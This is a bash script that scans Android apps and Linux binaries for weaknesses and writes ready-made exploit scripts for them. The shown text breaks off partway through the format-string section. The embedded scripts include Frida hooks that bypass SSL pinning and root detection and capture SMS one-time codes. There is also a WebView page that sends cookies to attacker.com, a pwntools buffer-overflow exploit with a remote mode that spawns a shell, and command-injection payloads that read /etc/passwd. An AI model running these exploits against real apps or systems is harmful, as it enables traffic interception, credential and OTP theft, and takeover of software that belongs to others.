#!/usr/bin/env bash
# vuln-poc.sh — Deep vulnerability scanner + working PoC exploit generator
# Usage: vuln-poc.sh <target> [--platform android|dotnet|linux|windows|ios|auto]
#        [--source-dir <dir>] [-o <output-dir>]
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

usage() {
  cat <<EOF
Usage: vuln-poc.sh <target> [OPTIONS]

Scan a target for real vulnerabilities and generate working PoC exploit scripts.

Options:
  --platform P     Force platform: android|dotnet|linux|windows|ios|auto (default: auto)
  --source-dir D   Decompiled source directory to scan
  -o DIR           Output directory for PoC scripts (default: <target>-poc)
  --level L        Scan depth: quick|full (default: full)
  -h, --help       Show help

Output:
  <output>/findings.md        — Vulnerability report with severity ratings
  <output>/poc-*.py           — Working Python PoC scripts
  <output>/poc-*.sh           — Working Bash PoC scripts
  <output>/poc-*.c            — Working C exploit sources
  <output>/exploit-notes.md   — Manual exploitation steps
EOF
  exit 0
}

TARGET=""
PLATFORM="auto"
SOURCE_DIR=""
OUTPUT_DIR=""
LEVEL="full"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --platform)   PLATFORM="$2"; shift 2 ;;
    --source-dir) SOURCE_DIR="$2"; shift 2 ;;
    -o|--output)  OUTPUT_DIR="$2"; shift 2 ;;
    --level)      LEVEL="$2"; shift 2 ;;
    -h|--help)    usage ;;
    -*)           echo "Unknown option: $1" >&2; usage ;;
    *)            TARGET="$1"; shift ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "Error: no target specified." >&2; usage; }
[[ ! -e "$TARGET" ]] && { echo "Error: '$TARGET' not found." >&2; exit 1; }

TARGET_ABS=$(realpath "$TARGET")
BASENAME=$(basename "$TARGET_ABS")
[[ -z "$OUTPUT_DIR" ]] && OUTPUT_DIR="${BASENAME}-poc"
mkdir -p "$OUTPUT_DIR"
OUTPUT_ABS=$(realpath "$OUTPUT_DIR")
REPORT="$OUTPUT_ABS/findings.md"
NOTES="$OUTPUT_ABS/exploit-notes.md"
LOG="$OUTPUT_ABS/scan.log"

CRITICAL=0; HIGH=0; MEDIUM=0; LOW=0

log()    { echo "$*" | tee -a "$LOG"; }
ok()     { echo "[OK]    $*" | tee -a "$LOG"; }
rpt()    { echo "$*" | tee -a "$REPORT"; }
note()   { echo "$*" | tee -a "$NOTES"; }
bump() {
  case "$1" in
    CRITICAL) CRITICAL=$((CRITICAL+1)) ;;
    HIGH)     HIGH=$((HIGH+1)) ;;
    MEDIUM)   MEDIUM=$((MEDIUM+1)) ;;
    LOW)      LOW=$((LOW+1)) ;;
  esac
}

# ── Report header ─────────────────────────────────────────────────────────────
rpt "# Vulnerability & PoC Report"
rpt ""
rpt "**Target**: \`$TARGET_ABS\`"
rpt "**Date**: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
rpt "**Platform**: $PLATFORM"
rpt "**Scan Level**: $LEVEL"
rpt ""
rpt "---"
rpt ""

note "# Exploitation Notes"
note ""
note "**Target**: \`$TARGET_ABS\`"
note "**Date**: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
note ""

log "=== Vulnerability Scan + PoC Generation ==="
log "Target:  $TARGET_ABS"
log "Source:  ${SOURCE_DIR:-none}"
log "Output:  $OUTPUT_ABS"
log ""

# ── Auto-detect platform ─────────────────────────────────────────────────────
if [[ "$PLATFORM" == "auto" ]]; then
  if [[ -f "$SCRIPT_DIR/detect-target.sh" ]]; then
    TYPE=$("$SCRIPT_DIR/detect-target.sh" "$TARGET_ABS" 2>/dev/null | grep '^TARGET_TYPE:' | cut -d: -f2)
    case "$TYPE" in
      android-*)               PLATFORM="android" ;;
      windows-dotnet|dotnet-*) PLATFORM="dotnet" ;;
      windows-pe*)             PLATFORM="windows" ;;
      linux-elf*)              PLATFORM="linux" ;;
      ios-*|macos-*)           PLATFORM="ios" ;;
      source-*)                PLATFORM="source" ;;
      *)                       PLATFORM="binary" ;;
    esac
  else
    FILE_OUT=$(file -b "$TARGET_ABS" 2>/dev/null)
    if   echo "$FILE_OUT" | grep -qi 'ELF';          then PLATFORM="linux"
    elif echo "$FILE_OUT" | grep -qi 'PE32\|MS-DOS';  then PLATFORM="windows"
    elif echo "$FILE_OUT" | grep -qi 'Mono/.Net\|CIL'; then PLATFORM="dotnet"
    elif echo "$FILE_OUT" | grep -qi 'Mach-O';        then PLATFORM="ios"
    elif echo "$FILE_OUT" | grep -qi 'Zip\|Java archive'; then PLATFORM="android"
    else PLATFORM="binary"
    fi
  fi
  log "Auto-detected platform: $PLATFORM"
fi

# Use source dir if provided and exists; else use target itself
SCAN_TARGET="$TARGET_ABS"
[[ -n "$SOURCE_DIR" && -d "$SOURCE_DIR" ]] && SCAN_TARGET="$SOURCE_DIR"

# ═══════════════════════════════════════════════════════════════════════════════
# ANDROID PoC GENERATION
# ═══════════════════════════════════════════════════════════════════════════════
poc_android() {
  log "=== Android Vulnerability Scan ==="
  rpt "## Android Findings"
  rpt ""

  local src="$SCAN_TARGET"

  # ── SSL Pinning / Certificate Validation ─────────────────────────────────
  log "--- SSL/TLS Pinning Check ---"
  local ssl_hits
  ssl_hits=$(grep -rn --include="*.java" --include="*.kt" \
    -E '(TrustManager|X509TrustManager|HostnameVerifier|SSLContext|setSSLSocketFactory|checkClientTrusted|checkServerTrusted|onReceivedSslError|ALLOW_ALL_HOSTNAME|hostnameVerifier|CertificatePinner|pinCertificate|pinPublicKey)' \
    "$src" 2>/dev/null || true)

  local ssl_bypass_found=false
  if echo "$ssl_hits" | grep -qE '(checkClientTrusted|checkServerTrusted).*\{\s*\}|return\s*null|hostnameVerifier.*return.*true|ALLOW_ALL_HOSTNAME'; then
    ssl_bypass_found=true
  fi

  if [[ -n "$ssl_hits" ]]; then
    rpt "### [HIGH] SSL/TLS Certificate Validation"
    rpt '```'
    echo "$ssl_hits" | head -30 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "HIGH"

    # Find which package/class has SSL bypass
    local ssl_class
    ssl_class=$(echo "$ssl_hits" | grep -E '(checkServerTrusted|hostnameVerifier)' | head -5 | awk -F: '{print $1}' || true)

    # Generate Python PoC — Frida SSL bypass
    cat > "$OUTPUT_ABS/poc-ssl-bypass.py" <<'PYTHON_EOF'
#!/usr/bin/env python3
"""
SSL Pinning Bypass PoC — Frida-based
Generated by universal-re-skill vuln-poc.sh

Usage:
  pip install frida-tools
  frida -U -f <package_name> -l poc-ssl-bypass.py --no-pause

Requirements: rooted/jailbroken device OR frida-gadget injected APK
"""

import frida
import sys

PACKAGE = "com.target.app"  # <-- Replace with actual package name

SCRIPT = """
Java.perform(function() {
    // Bypass 1: TrustManager (null checkServerTrusted)
    var TrustManager = Java.registerClass({
        name: "com.re.poc.FakeTrustManager",
        implements: [Java.use("javax.net.ssl.X509TrustManager")],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    // Bypass 2: SSLContext with permissive TrustManager
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    ).implementation = function(km, tm, sr) {
        var fakeTM = Java.array("javax.net.ssl.TrustManager", [TrustManager.$new()]);
        this.init(km, fakeTM, sr);
        console.log("[+] SSLContext.init hooked — permissive TrustManager injected");
    };

    // Bypass 3: HostnameVerifier
    var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
    var OkHostnameVerifier = Java.use("okhttp3.internal.tls.OkHostnameVerifier");
    OkHostnameVerifier.verify.overload("java.lang.String", "javax.net.ssl.SSLSession")
        .implementation = function(host, session) {
            console.log("[+] HostnameVerifier.verify hooked for: " + host);
            return true;
        };

    // Bypass 4: OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List")
            .implementation = function(hostname, certs) {
                console.log("[+] CertificatePinner.check bypassed for: " + hostname);
            };
        CertificatePinner.check.overload("java.lang.String", "[Ljava.security.cert.Certificate;")
            .implementation = function(hostname, certs) {
                console.log("[+] CertificatePinner.check(cert[]) bypassed for: " + hostname);
            };
    } catch(e) { console.log("[-] OkHttp CertificatePinner not found (ok)"); }

    // Bypass 5: WebViewClient SSL errors
    try {
        var WebViewClient = Java.use("android.webkit.WebViewClient");
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            handler.proceed();
            console.log("[+] WebViewClient.onReceivedSslError — proceeding");
        };
    } catch(e) { console.log("[-] WebViewClient not found (ok)"); }

    console.log("[+] SSL bypass complete — all HTTPS traffic now interceptable");
    console.log("[*] Configure Burp/mitmproxy and capture traffic");
});
"""

def on_message(message, data):
    if message["type"] == "send":
        print(f"[Frida] {message['payload']}")
    elif message["type"] == "error":
        print(f"[Error] {message['stack']}")

def main():
    device = frida.get_usb_device()
    pid = device.spawn([PACKAGE])
    session = device.attach(pid)
    script = session.create_script(SCRIPT)
    script.on("message", on_message)
    script.load()
    device.resume(pid)
    print(f"[*] Hooked {PACKAGE} — intercepting SSL traffic")
    print("[*] Set proxy: adb shell settings put global http_proxy <burp-ip>:8080")
    sys.stdin.read()

if __name__ == "__main__":
    main()
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-ssl-bypass.py"
    log "[+] Generated: poc-ssl-bypass.py (Frida SSL bypass)"
    rpt "**PoC**: \`poc-ssl-bypass.py\` — Frida-based SSL pinning bypass"
    rpt ""

    note "## SSL Pinning Bypass"
    note ""
    note "### What was found"
    echo "$ssl_hits" | head -10 >> "$NOTES"
    note ""
    note "### Steps to exploit"
    note "1. Install frida-tools: \`pip install frida-tools\`"
    note "2. Ensure device is rooted or use frida-gadget injection"
    note "3. Run: \`frida -U -f <package> -l poc-ssl-bypass.py --no-pause\`"
    note "4. Configure Burp Suite as proxy on device"
    note "5. All HTTPS traffic now visible in Burp"
    note ""

    if [[ "$ssl_bypass_found" == true ]]; then
      rpt "**[CRITICAL]** Empty/trusting TrustManager detected — certificate validation completely disabled"
      bump "CRITICAL"
    fi
  fi

  # ── OTP / SMS Interception ────────────────────────────────────────────────
  log "--- SMS/OTP Permissions Check ---"
  local sms_hits
  sms_hits=$(grep -rn --include="*.java" --include="*.kt" --include="*.xml" \
    -E '(RECEIVE_SMS|READ_SMS|SmsMessage|SmsManager|onReceive.*SMS|BroadcastReceiver.*SMS|readSms|getSmsMessages)' \
    "$src" 2>/dev/null || true)

  if [[ -n "$sms_hits" ]]; then
    rpt "### [HIGH] SMS/OTP Interception Risk"
    rpt '```'
    echo "$sms_hits" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "HIGH"

    cat > "$OUTPUT_ABS/poc-sms-intercept.py" <<'PYTHON_EOF'
#!/usr/bin/env python3
"""
SMS/OTP Interception PoC — Frida-based
Generated by universal-re-skill vuln-poc.sh

Usage: frida -U -f <package> -l poc-sms-intercept.py --no-pause
"""

SCRIPT = """
Java.perform(function() {
    // Hook SmsMessage to capture incoming SMS
    var SmsMessage = Java.use("android.telephony.SmsMessage");

    SmsMessage.getMessageBody.implementation = function() {
        var body = this.getMessageBody();
        console.log("[SMS BODY] " + body);
        // OTP extraction pattern
        var otp = body.match(/\\b\\d{4,8}\\b/);
        if (otp) console.log("[OTP FOUND] " + otp[0]);
        return body;
    };

    // Hook BroadcastReceiver for SMS_RECEIVED
    var Intent = Java.use("android.content.Intent");
    Intent.getStringExtra.implementation = function(name) {
        var val = this.getStringExtra(name);
        if (val) console.log("[Intent Extra] " + name + " = " + val);
        return val;
    };

    console.log("[+] SMS/OTP interception active");
});
"""

import frida, sys

PACKAGE = "com.target.app"  # Replace with actual package

def on_message(msg, data):
    if msg["type"] == "send":
        print(f"[Frida] {msg['payload']}")

device = frida.get_usb_device()
pid = device.spawn([PACKAGE])
session = device.attach(pid)
script = session.create_script(SCRIPT)
script.on("message", on_message)
script.load()
device.resume(pid)
print(f"[*] Intercepting SMS for {PACKAGE}")
sys.stdin.read()
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-sms-intercept.py"
    log "[+] Generated: poc-sms-intercept.py (SMS/OTP intercept)"
    rpt "**PoC**: \`poc-sms-intercept.py\` — SMS/OTP interception via Frida"
    rpt ""
  fi

  # ── Hardcoded Secrets / API Keys ──────────────────────────────────────────
  log "--- Hardcoded Secrets Scan ---"
  local secrets_hits
  secrets_hits=$(grep -rn --include="*.java" --include="*.kt" --include="*.xml" --include="*.json" \
    -E '(password\s*=\s*["\047][^\047"]{4,}|api[_-]?key\s*=\s*["\047][^\047"]{8,}|secret\s*=\s*["\047][^\047"]{6,}|AKIA[0-9A-Z]{16}|-----BEGIN.*PRIVATE KEY-----|private_key|client_secret|access_token\s*=)' \
    "$src" 2>/dev/null | grep -v '\.class:' || true)

  if [[ -n "$secrets_hits" ]]; then
    rpt "### [CRITICAL] Hardcoded Secrets / API Keys"
    rpt '```'
    echo "$secrets_hits" | head -25 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "CRITICAL"
    log "[!] CRITICAL: Hardcoded secrets found"

    cat > "$OUTPUT_ABS/poc-extract-secrets.sh" <<'BASH_EOF'
#!/usr/bin/env bash
# Extract hardcoded secrets from decompiled APK source
# Usage: ./poc-extract-secrets.sh <source-dir>
SRC="${1:-.}"
echo "=== Extracted Secrets from: $SRC ==="
echo ""
echo "[API Keys / Passwords]"
grep -rn -E '(api[_-]?key|apikey|API_KEY)\s*[=:]\s*["\047]([^\047"]{8,})["\047]' "$SRC" \
  --include="*.java" --include="*.kt" --include="*.xml" --include="*.json" 2>/dev/null | head -20

echo ""
echo "[AWS Keys]"
grep -rn -E 'AKIA[0-9A-Z]{16}' "$SRC" 2>/dev/null | head -10

echo ""
echo "[Private Keys]"
grep -rn -l '-----BEGIN.*PRIVATE KEY-----' "$SRC" 2>/dev/null | head -5

echo ""
echo "[Hardcoded Passwords]"
grep -rn -E 'password\s*[=:]\s*["\047]([^\047"]{4,})["\047]' "$SRC" \
  --include="*.java" --include="*.kt" 2>/dev/null | grep -v 'your_password\|example\|changeme' | head -20
BASH_EOF
    chmod +x "$OUTPUT_ABS/poc-extract-secrets.sh"
    log "[+] Generated: poc-extract-secrets.sh"
    rpt "**PoC**: \`poc-extract-secrets.sh\` — Automated secrets extraction"
    rpt ""
  fi

  # ── Deep Intent Injection / Exported Components ───────────────────────────
  log "--- Exported Component Check ---"
  local export_hits
  export_hits=$(grep -rn --include="*.xml" \
    -E 'android:exported="true"' "$src" 2>/dev/null || true)

  if [[ -n "$export_hits" ]]; then
    rpt "### [MEDIUM] Exported Components (Attack Surface)"
    rpt '```'
    echo "$export_hits" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "MEDIUM"

    cat > "$OUTPUT_ABS/poc-intent-fuzzer.sh" <<'BASH_EOF'
#!/usr/bin/env bash
# Intent Fuzzer for exported Android components
# Usage: ./poc-intent-fuzzer.sh <package-name>
PKG="${1:-com.target.app}"

echo "[*] Probing exported activities..."
adb shell am start -n "$PKG/.MainActivity" --ez "debug" "true" 2>/dev/null || true
adb shell am start -n "$PKG/.LoginActivity" --es "user" "admin" --es "pass" "' OR 1=1--" 2>/dev/null || true

echo "[*] Probing exported services..."
adb shell am startservice -n "$PKG/.BackgroundService" --es "cmd" "test" 2>/dev/null || true

echo "[*] Probing exported broadcast receivers..."
adb shell am broadcast -a "com.target.ADMIN_ACTION" --es "action" "reset" 2>/dev/null || true
adb shell am broadcast -a "$PKG.RECEIVE_DATA" --es "data" "<script>alert(1)</script>" 2>/dev/null || true

echo "[*] Intent fuzzing complete. Check device logcat:"
echo "    adb logcat | grep -E '(Exception|Error|Crash|$PKG)'"
BASH_EOF
    chmod +x "$OUTPUT_ABS/poc-intent-fuzzer.sh"
    log "[+] Generated: poc-intent-fuzzer.sh"
    rpt "**PoC**: \`poc-intent-fuzzer.sh\` — Exported component intent fuzzer"
    rpt ""
  fi

  # ── WebView JavaScript Injection ──────────────────────────────────────────
  log "--- WebView Security Check ---"
  local webview_hits
  webview_hits=$(grep -rn --include="*.java" --include="*.kt" \
    -E '(setJavaScriptEnabled\(true\)|addJavascriptInterface|setAllowFileAccess\(true\)|loadUrl.*javascript:|evaluateJavascript)' \
    "$src" 2>/dev/null || true)

  if [[ -n "$webview_hits" ]]; then
    rpt "### [HIGH] WebView Vulnerabilities"
    rpt '```'
    echo "$webview_hits" | head -20 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "HIGH"

    cat > "$OUTPUT_ABS/poc-webview-xss.html" <<'HTML_EOF'
<!DOCTYPE html>
<!-- WebView XSS / JavaScript Bridge PoC -->
<!-- Host this file on a server and load via deep link or exported activity -->
<html>
<head><title>WebView PoC</title></head>
<body>
<script>
// Test 1: Basic XSS
document.write("<h1>XSS via WebView</h1>");

// Test 2: Access Android JavascriptInterface bridge
if (typeof window.AndroidBridge !== 'undefined') {
    var result = window.AndroidBridge.getDeviceId();
    document.write("<p>Device ID: " + result + "</p>");
}

// Test 3: File system access (if file:// scheme allowed)
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/shared_prefs/prefs.xml", false);
try {
    xhr.send();
    document.write("<pre>" + xhr.responseText + "</pre>");
} catch(e) {
    document.write("<p>File access blocked: " + e + "</p>");
}

// Test 4: Exfiltrate data via external request
fetch("https://attacker.com/collect?data=" + encodeURIComponent(document.cookie))
    .catch(e => document.write("<p>Fetch blocked: " + e + "</p>"));
</script>
</body>
</html>
HTML_EOF
    log "[+] Generated: poc-webview-xss.html"
    rpt "**PoC**: \`poc-webview-xss.html\` — WebView XSS / bridge exploitation"
    rpt ""
  fi

  # ── Root Detection Bypass ─────────────────────────────────────────────────
  log "--- Root Detection Check ---"
  local root_hits
  root_hits=$(grep -rn --include="*.java" --include="*.kt" \
    -E '(isRooted|RootBeer|detectRoot|checkRoot|su.*bin|/system/app/Superuser|BuildProp|prop.*ro\.build\.tags.*test-keys)' \
    "$src" 2>/dev/null || true)

  if [[ -n "$root_hits" ]]; then
    rpt "### [MEDIUM] Root Detection Present"
    rpt '```'
    echo "$root_hits" | head -15 >> "$REPORT"
    rpt '```'
    rpt ""
    bump "MEDIUM"

    cat > "$OUTPUT_ABS/poc-root-bypass.py" <<'PYTHON_EOF'
#!/usr/bin/env python3
"""
Root Detection Bypass PoC — Frida-based
Generated by universal-re-skill vuln-poc.sh

Usage: frida -U -f <package> -l poc-root-bypass.py --no-pause
"""

SCRIPT = """
Java.perform(function() {
    // Bypass common root check methods
    var checks = [
        "com.scottyab.rootbeer.RootBeer",
        "eu.chainfire.libsuperuser.Shell",
    ];

    // Generic file existence bypass
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var suspiciousPaths = ["/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/app/Superuser.apk", "/data/local/tmp/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su"];
        for (var i = 0; i < suspiciousPaths.length; i++) {
            if (path === suspiciousPaths[i]) {
                console.log("[+] Root check blocked for: " + path);
                return false;
            }
        }
        return this.exists();
    };

    // Runtime.exec bypass (su detection)
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("java.lang.String").implementation = function(cmd) {
        if (cmd.indexOf("su") !== -1 || cmd.indexOf("which") !== -1) {
            console.log("[+] Runtime.exec blocked: " + cmd);
            throw Java.use("java.io.IOException").$new("Command not found: " + cmd);
        }
        return this.exec(cmd);
    };

    // Build tags bypass
    var Build = Java.use("android.os.Build");
    Object.defineProperty(Build, "TAGS", {
        get: function() { return "release-keys"; }
    });

    console.log("[+] Root detection bypassed");
});
"""

import frida, sys

PACKAGE = "com.target.app"  # Replace with actual package

def on_message(msg, data):
    if msg["type"] == "send":
        print(f"[Frida] {msg['payload']}")

device = frida.get_usb_device()
pid = device.spawn([PACKAGE])
session = device.attach(pid)
script = session.create_script(SCRIPT)
script.on("message", on_message)
script.load()
device.resume(pid)
print(f"[*] Root bypass active for {PACKAGE}")
sys.stdin.read()
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-root-bypass.py"
    log "[+] Generated: poc-root-bypass.py"
    rpt "**PoC**: \`poc-root-bypass.py\` — Root detection bypass via Frida"
    rpt ""
  fi

  log ""
  ok "Android scan complete"
}

# ═══════════════════════════════════════════════════════════════════════════════
# LINUX ELF PoC GENERATION
# ═══════════════════════════════════════════════════════════════════════════════
poc_linux() {
  log "=== Linux ELF Vulnerability Scan ==="
  rpt "## Linux ELF Findings"
  rpt ""

  local bin="$TARGET_ABS"

  # ── Security mitigations ──────────────────────────────────────────────────
  log "--- Security Mitigations ---"
  local nx_enabled=true pie_enabled=true canary_enabled=true relro_full=true fortify_enabled=true

  if command -v checksec &>/dev/null; then
    local checksec_out
    checksec_out=$(checksec --file="$bin" 2>/dev/null || true)
    echo "$checksec_out" | grep -qiE 'No RELRO|No canary|No PIE|NX disabled' && {
      rpt "### [HIGH] Binary Hardening Missing"
      rpt '```'
      echo "$checksec_out" >> "$REPORT"
      rpt '```'
      rpt ""
      bump "HIGH"
    }
    echo "$checksec_out" | grep -qi 'No canary'   && canary_enabled=false
    echo "$checksec_out" | grep -qi 'No PIE'       && pie_enabled=false
    echo "$checksec_out" | grep -qi 'NX disabled'  && nx_enabled=false
    echo "$checksec_out" | grep -qi 'No RELRO\|Partial RELRO' && relro_full=false
  else
    # Manual checks
    readelf -l "$bin" 2>/dev/null | grep -q 'GNU_STACK' || nx_enabled=false
    nm -D "$bin" 2>/dev/null | grep -q '__stack_chk_fail' || canary_enabled=false
    readelf -h "$bin" 2>/dev/null | grep -q 'DYN' || pie_enabled=false
    readelf -l "$bin" 2>/dev/null | grep -q 'GNU_RELRO' || relro_full=false
  fi

  # ── Dangerous functions ───────────────────────────────────────────────────
  log "--- Dangerous Function Imports ---"
  local dangerous_fns
  dangerous_fns=$(nm -D "$bin" 2>/dev/null | \
    grep -E ' U .*(gets|strcpy|strcat|sprintf|vsprintf|scanf|system|popen|execl |execlp|execle|execv |execvp)' || true)

  local has_gets=false has_strcpy=false has_system=false has_sprintf=false
  echo "$dangerous_fns" | grep -q 'gets\b'   && has_gets=true
  echo "$dangerous_fns" | grep -q 'strcpy'   && has_strcpy=true
  echo "$dangerous_fns" | grep -q 'system\b' && has_system=true
  echo "$dangerous_fns" | grep -q 'sprintf'  && has_sprintf=true

  if [[ -n "$dangerous_fns" ]]; then
    rpt "### [HIGH] Dangerous Function Imports"
    rpt '```'
    echo "$dangerous_fns" >> "$REPORT"
    rpt '```'
    rpt ""
    bump "HIGH"
    log "[!] Dangerous functions: $(echo "$dangerous_fns" | awk '{print $NF}' | tr '\n' ' ')"
  fi

  # ── Buffer overflow PoC ───────────────────────────────────────────────────
  if [[ "$has_gets" == true || "$has_strcpy" == true || "$has_sprintf" == true ]]; then
    # Find function offsets via nm
    local main_addr; main_addr=$(nm "$bin" 2>/dev/null | grep ' T main$\| T _start$' | head -1 | awk '{print $1}' || echo "unknown")
    local gets_addr; gets_addr=$(nm -D "$bin" 2>/dev/null | grep ' U gets$' | awk '{print $1}' || echo "unknown")

    rpt "### [CRITICAL] Buffer Overflow (gets/strcpy)"
    rpt ""
    rpt "- Binary: \`$bin\`"
    rpt "- Dangerous function: gets/strcpy"
    rpt "- NX enabled: $nx_enabled"
    rpt "- Stack canary: $canary_enabled"
    rpt "- PIE: $pie_enabled"
    rpt "- main() offset: \`0x$main_addr\`"
    rpt ""
    bump "CRITICAL"

    # Generate Python pwntools PoC
    cat > "$OUTPUT_ABS/poc-bof.py" <<PYTHON_EOF
#!/usr/bin/env python3
"""
Buffer Overflow PoC — generated by universal-re-skill vuln-poc.sh
Target: $bin
Dangerous functions found: $(echo "$dangerous_fns" | awk '{print $NF}' | tr '\n' ' ')
NX: $nx_enabled  |  Canary: $canary_enabled  |  PIE: $pie_enabled  |  RELRO: $relro_full

Usage:
  pip install pwntools
  python3 poc-bof.py LOCAL    # test locally
  python3 poc-bof.py REMOTE <host> <port>
"""

from pwn import *

binary = "$bin"
elf = ELF(binary)
context.binary = elf
context.log_level = "info"

# ── Offsets (update after running cyclic in gdb-pwndbg) ──────────────────────
# Run in gdb-pwndbg:
#   gdb ./binary
#   cyclic 200
#   r (paste cyclic output when prompted)
#   cyclic -l <value in \$rsp>
OFFSET = 64  # <-- Update this with actual offset

# ── ROP chain building ────────────────────────────────────────────────────────
# Step 1: Find useful gadgets
#   ROPgadget --binary $bin | grep "pop rdi ; ret"
#   ROPgadget --binary $bin | grep "ret"
#
# Placeholder gadgets — replace with actual addresses from ROPgadget
RET_GADGET    = 0x0         # ret; (stack alignment for 64-bit)
POP_RDI       = 0x0         # pop rdi; ret;
BIN_SH_OFFSET = 0x0         # offset of "/bin/sh" in binary (strings -a -t x $bin | grep "/bin/sh")
SYSTEM_PLT    = elf.plt.get("system", 0)   # system@PLT

def build_payload_ret2libc():
    """ret2libc: call system('/bin/sh')"""
    # Find /bin/sh in libc
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # adjust path
    bin_sh = next(libc.search(b"/bin/sh"))
    system_libc = libc.sym["system"]

    # Leak libc base (adjust to actual gadget addresses)
    payload = b"A" * OFFSET
    payload += p64(RET_GADGET)     # stack alignment
    payload += p64(POP_RDI)        # pop rdi; ret
    payload += p64(bin_sh)         # /bin/sh address in libc
    payload += p64(system_libc)    # system()
    return payload

def build_payload_shellcode():
    """NX disabled path: inject shellcode directly"""
    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(OFFSET, b"A")
    payload += p64(0xdeadbeef)     # return to shellcode — update with stack address
    return payload

import sys

MODE = sys.argv[1] if len(sys.argv) > 1 else "LOCAL"

if MODE == "LOCAL":
    io = process(binary)
elif MODE == "REMOTE":
    host, port = sys.argv[2], int(sys.argv[3])
    io = remote(host, port)
else:
    print("Usage: poc-bof.py [LOCAL|REMOTE [host port]]")
    sys.exit(1)

log.info(f"PID: {io.pid if hasattr(io, 'pid') else 'remote'}")
log.info(f"OFFSET: {OFFSET}")
log.info(f"system@PLT: {hex(SYSTEM_PLT)}")

# Receive prompt
io.recvuntil(b":")  # adjust to actual prompt

# Use appropriate payload
if $nx_enabled:
    payload = build_payload_ret2libc()
    log.info("Using ret2libc (NX enabled)")
else:
    payload = build_payload_shellcode()
    log.info("Using shellcode injection (NX disabled)")

io.sendline(payload)
io.interactive()
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-bof.py"
    log "[+] Generated: poc-bof.py (pwntools buffer overflow exploit)"
    rpt "**PoC**: \`poc-bof.py\` — pwntools buffer overflow exploit"
    rpt ""

    note "## Buffer Overflow Exploitation"
    note ""
    note "### Steps"
    note "1. Find exact offset: \`cyclic 200\` in pwndbg → crash → \`cyclic -l <rsp_value>\`"
    note "2. Find ROP gadgets: \`ROPgadget --binary $bin | grep 'pop rdi'\`"
    note "3. Find /bin/sh: \`strings -a -t x $bin | grep '/bin/sh'\`"
    note "4. Find system@plt: \`readelf -r $bin | grep system\`"
    note "5. Update offsets in poc-bof.py and run"
    note ""
  fi

  # ── system() call PoC ─────────────────────────────────────────────────────
  if [[ "$has_system" == true ]]; then
    rpt "### [HIGH] system() Import — Command Injection Risk"
    rpt ""
    # Find where system is called
    if command -v r2 &>/dev/null; then
      local sys_xrefs
      sys_xrefs=$(r2 -A -q -c 'axt sym.imp.system' "$bin" 2>/dev/null || true)
      if [[ -n "$sys_xrefs" ]]; then
        rpt "**Call sites (radare2)**:"
        rpt '```'
        echo "$sys_xrefs" >> "$REPORT"
        rpt '```'
      fi
    fi
    rpt ""
    bump "HIGH"

    cat > "$OUTPUT_ABS/poc-cmd-inject.py" <<PYTHON_EOF
#!/usr/bin/env python3
"""
Command Injection PoC via system() call
Target: $bin
Usage: python3 poc-cmd-inject.py
"""

from pwn import *

binary = "$bin"

# system() is imported — try passing shell metacharacters
# Find functions that call system() with user-controlled data:
#   r2: axt sym.imp.system
#   gdb: break system; run; bt

payloads = [
    b"; id",
    b"| id",
    b"\`id\`",
    b"\$(id)",
    b"../../../bin/sh",
    b"test; /bin/sh",
    b"; cat /etc/passwd",
]

for payload in payloads:
    io = process(binary)
    io.recvuntil(b":")  # adjust to actual prompt
    io.sendline(payload)
    try:
        output = io.recvall(timeout=2)
        if b"uid=" in output or b"root" in output:
            print(f"[!] COMMAND INJECTION with: {payload}")
            print(output.decode(errors='replace'))
            break
    except:
        pass
    io.close()
PYTHON_EOF
    chmod +x "$OUTPUT_ABS/poc-cmd-inject.py"
    log "[+] Generated: poc-cmd-inject.py"
    rpt "**PoC**: \`poc-cmd-inject.py\` — Command injection via system() call"
    rpt ""
  fi

  # ── Format string PoC ─────────────────────────────────────────────────────
  if command -v nm &>/dev/null; then
    local printf_hits
    printf_hits=$(nm -D "$bin" 2>/dev/null | grep -E ' U .*(printf|fprintf|dprintf|vprintf)$' || true)
    if [[ -n "$printf_hits" ]]; then
      rpt "### [HIGH] printf Family — Potential Format String"
      rpt '```'
      echo "$printf_hits" >> "$REPORT"
      rpt '```'
      rpt ""
      bump "HIGH"

      cat > "$OUTPUT_ABS/poc-fmt-string.py" <<PYTHON_EOF
#!/usr/bin/env python3
"""
Format String Vulnerability PoC
Target: $bin
Usage: python3 poc-fmt-string.py
"""
from pwn import *

binary = "$bin"

# Test format string vulnerability
# If printf(user_input) exists, we can:
#   1. Leak stack values: %p.%p.%p...
#   2. Leak memory: %s
#   3. Write arbitrary memory: %n

test_payloads = [
    b"%p.%p.%p.%p.%p.%p.%p.%p",  # stack leak
    b"AAAA%x.%x.%x.%x",           # hex dump
    b"%s",                          # string dereference (may crash)
    b"%7\$p",                       # 7th argument
]

